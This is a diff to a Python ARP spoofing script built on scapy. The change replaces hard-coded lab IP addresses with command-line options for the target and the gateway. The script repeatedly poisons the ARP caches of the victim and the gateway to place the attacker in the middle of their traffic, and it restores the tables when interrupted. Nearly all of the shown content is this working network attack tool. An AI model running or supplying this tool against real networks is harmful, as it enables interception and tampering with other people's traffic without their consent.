@@ -1,13 +1,25 @@
 import sys
 import time
 import scapy.all as scapy
-
+from optparse import *
 """
 op = set to the ARP response, 1 = request
 pdst = victim IP addr
 hwdst = victim MAC
 psrc = set the packet source IP to gateway IP addr
 """
+
+def get_args():
+    parser = OptionParser()
+    parser.add_option("-t", "--target",help="define the target IP", dest="target_ip")
+    parser.add_option("-g", "--gateway",help="define the gateway IP", dest="gateway_ip")
+    (options, args) = parser.parse_args()
+    if not options.target_ip:
+        parser.error("please specify the target ip")
+    elif not options.gateway_ip:
+        parser.error("please specify the gateway ip")
+    else:
+        return options
 
 
 def get_mac(ip):
@@ -41,10 +53,11 @@ def restore(dst_ip, src_ip):
 
 i = 0
 keep_looping = True
+options = get_args()
 try:
     while keep_looping:
-        spoof("192.168.159.133", "192.168.159.2")
-        spoof("192.168.159.2", "192.168.159.133")
+        spoof(options.target_ip, options.gateway_ip)
+        spoof(options.gateway_ip, options.target_ip)
         i += 2
         print(f"\rsending the {i} packets", end="")
         sys.stdout.flush()
@@ -52,7 +65,7 @@ try:
 except KeyboardInterrupt:
     print("\n[+] Detected CTRL + C ... Quitting.\n"
           "reset the ARP table...")
-    restore("192.168.159.133", "192.168.159.2")
-    restore( "192.168.159.2", "192.168.159.133")
+    restore(options.target_ip, options.gateway_ip)
+    restore( options.gateway_ip, options.target_ip)
 
 
